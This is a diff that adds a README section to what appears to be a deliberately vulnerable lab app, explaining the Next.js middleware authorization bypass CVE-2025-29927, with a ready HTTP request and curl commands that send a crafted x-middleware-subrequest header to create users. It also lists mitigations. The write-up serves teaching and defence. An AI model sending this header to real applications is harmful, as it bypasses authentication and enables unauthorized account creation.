@@ -88,6 +88,77 @@ The middleware implementation processes incoming HTTP requests and examines vari
 
 Next.js middleware operates at the edge, intercepting requests before they reach API routes or pages, allowing for request manipulation and routing decisions.
 
+## Vulnerability Analysis: CVE-2025-29927
+
+### Next.js Middleware Authorization Bypass
+
+This application demonstrates **CVE-2025-29927**, a critical vulnerability in Next.js middleware that allows authorization bypass through manipulation of internal HTTP headers.
+
+### Technical Details
+
+**Vulnerability**: Next.js versions 13.4.0 - 15.2.1 contain a flaw where the framework improperly handles the internal `x-middleware-subrequest` header, allowing attackers to bypass middleware protection entirely.
+
+**Root Cause**: Next.js uses the `x-middleware-subrequest` header internally to track middleware recursion depth and prevent infinite loops. When this header is present with specific values, Next.js assumes the request is a legitimate internal subrequest and skips middleware execution.
+
+### Exploitation Method
+
+**Vulnerable Endpoint**: `POST /api/create-user`
+
+**Normal Behavior**: 
+- Request without proper authentication → `307 Temporary Redirect` to `/login`
+- Middleware executes and enforces authentication checks
+
+**Exploitation**:
+The vulnerability can be exploited using the following HTTP request:
+
+```http
+POST /api/create-user HTTP/1.1
+Host: medicloudx-onboarding-ctr9lkls.azurewebsites.net
+Content-Type: application/json
+x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
+
+{}
+```
+
+**Critical Header**: `x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware`
+
+**Key Points**:
+- The header value must match the middleware file path (`src/middleware` for `/src/middleware.js`)
+- Five repetitions separated by colons trigger the `MAX_RECURSION_DEPTH` condition
+- This bypasses middleware completely, allowing direct access to protected API endpoints
+
+### Attack Impact
+
+**Successful exploitation results in**:
+1. **Complete authentication bypass** - No credentials required
+2. **Direct API access** - Circumvents all middleware protections  
+3. **User creation capabilities** - Can create real Azure AD users
+4. **Privilege escalation** - Gains administrative functions without authorization
+
+### Verification Steps
+
+1. **Test normal behavior** (should redirect):
+   ```bash
+   curl -X POST https://medicloudx-onboarding-ctr9lkls.azurewebsites.net/api/create-user \
+     -H "Content-Type: application/json" \
+     -d "{}" -v
+   ```
+
+2. **Test vulnerability** (should succeed):
+   ```bash
+   curl -X POST https://medicloudx-onboarding-ctr9lkls.azurewebsites.net/api/create-user \
+     -H "Content-Type: application/json" \
+     -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
+     -d "{}" -v
+   ```
+
+### Mitigation
+
+- **Immediate**: Upgrade to Next.js 15.3.0+ where this vulnerability has been patched
+- **WAF Rule**: Block requests containing `x-middleware-subrequest` header at the web application firewall level
+- **Code Review**: Implement additional authorization checks within API route handlers
+- **Defense in Depth**: Never rely solely on middleware for security-critical operations
+
 ## Deployment Configuration
 
 ### Container Configuration
